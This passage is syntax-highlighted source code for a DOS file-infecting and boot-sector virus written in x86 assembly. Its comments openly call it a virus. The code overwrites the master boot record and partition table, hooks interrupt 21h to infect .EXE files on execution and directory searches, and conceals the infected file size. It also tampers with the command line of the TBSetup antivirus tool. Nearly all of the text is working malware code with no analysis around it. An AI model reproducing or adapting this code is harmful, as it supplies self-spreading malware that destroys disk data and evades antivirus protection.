                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; save MBR at 0,0,4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">payload_mbr</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">payload_mbr_lenght</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; lenght in dwords</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsd</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' NDP'</span><span class="sc0">              </span><span class="sc1">; be sure that the partition</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; table will be overwritten</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">saturn_stack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc4">],</span><span class="sc2">0aa55h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">                 </span><span class="sc1">; write the virus mbr</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; Fast infection on 4Eh/4Fh (Findfirst/Findnext)</span><span class="sc0">
</span><span class="sc5">findfirst_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc5">filename</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">; offset of filename</span><span class="sc0">
</span><span class="sc5">getpath</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; save search path</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pathexit</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; es:di = filename</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_sepa</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">getpath</span><span class="sc0">
</span><span class="sc5">ok_sepa</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenameoff</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getpath</span><span class="sc0">
</span><span class="sc5">pathexit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; restore regs</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">findnext_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                        </span><span class="sc1">; get DTA</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenameoff</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                        </span><span class="sc1">; filename</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">getfname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">isntadot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filedotoff</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">; save dot position</span><span class="sc0">
</span><span class="sc5">isntadot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; end of filename?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">getfname</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                  
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; ES:SI on filename in DTA</span><span class="sc0">
             
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">filedotoff</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">founded_dot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'EXE.'</span><span class="sc0">   </span><span class="sc1">; .exe</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">
</span><span class="sc5">ok_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inflenght</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_fast</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inflenght</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1eh</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; set real (infected)</span><span class="sc0">
                                                        </span><span class="sc1">; lenght in the DTA</span><span class="sc0">
</span><span class="sc5">go_away</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc1">; Virus Int 21h handler</span><span class="sc0">
</span><span class="sc5">vir_21handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1875h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_resid</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7975h</span><span class="sc0">                </span><span class="sc1">; residency check</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">no_resid</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fast_infection</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_fast_inf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findfirst_call</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findnext_call</span><span class="sc0">

</span><span class="sc5">no_fast_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">                </span><span class="sc1">; exec?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exec_call</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                  </span><span class="sc1">; program exiting?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">chain_21h</span><span class="sc0">               </span><span class="sc1">; if so reset fast_inf</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fast_infection</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">chain_21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_21h</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">


</span><span class="sc5">exec_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_vir_vl</span><span class="sc0">

</span><span class="sc5">infect_fast</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_sp</span><span class="sc4">],</span><span class="sc8">sp</span><span class="sc0">      </span><span class="sc1">; set to our stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21h_ss</span><span class="sc4">],</span><span class="sc8">ss</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">stack_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">simulate21</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_disk</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_vir</span><span class="sc0">

</span><span class="sc5">ok_disk</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">name_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">name_loop</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">name_loop</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">std</span><span class="sc0">
</span><span class="sc5">slash_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">                  </span><span class="sc1">; no digits in filename</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_number</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">exit_vir</span><span class="sc0">
</span><span class="sc5">no_number</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">slash_loop</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">; EAX = first 4 letters</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fast_infection</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_fast_now</span><span class="sc0">             </span><span class="sc1">; if already in fastinf then</span><span class="sc0">
                                                </span><span class="sc1">; we should be in a 4eh/4fh,</span><span class="sc0">
                                                </span><span class="sc1">; so no param change of coz :)</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'ESBT'</span><span class="sc0">              </span><span class="sc1">; TBSEtup running maybe?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_tbsetup</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'.PUT'</span><span class="sc0">        </span><span class="sc1">; be sure about it</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_tbsetup</span><span class="sc0">

</span><span class="sc5">tbsetup_cmd</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">; ES:BX on exec parameter block</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; DS:SI are on the command line parameters</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; get a rnd number</span><span class="sc0">
                                                        </span><span class="sc1">; from poly generator</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_too_evil</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc12">'da'</span><span class="sc0">                         </span><span class="sc1">; set 'Entire disk'</span><span class="sc0">
                                                        </span><span class="sc1">; instead of spaces</span><span class="sc0">
                                                        </span><span class="sc1">; as the cmdline if</span><span class="sc0">
                                                        </span><span class="sc1">; bad command found ]:)</span><span class="sc0">
</span><span class="sc5">not_too_evil</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                          </span><span class="sc1">; cr in dl</span><span class="sc0">

</span><span class="sc5">cmdline_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                           </span><span class="sc1">; CR? end of cmdline</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_cmdline</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                           </span><span class="sc1">; space?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cmdline_loop</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">; beginning of a cmd?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">; convert to lowercase</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ap'</span><span class="sc0">                         </span><span class="sc1">; pause at cmdline?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_pause</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_pause</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">long_pause</span><span class="sc0">
</span><span class="sc5">good_pause</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; delete bad cmd</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">
</span><span class="sc5">long_pause</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'es'</span><span class="sc0">                         </span><span class="sc1">; seems pause?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">good_lpa</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cmdline_loop</span><span class="sc0">
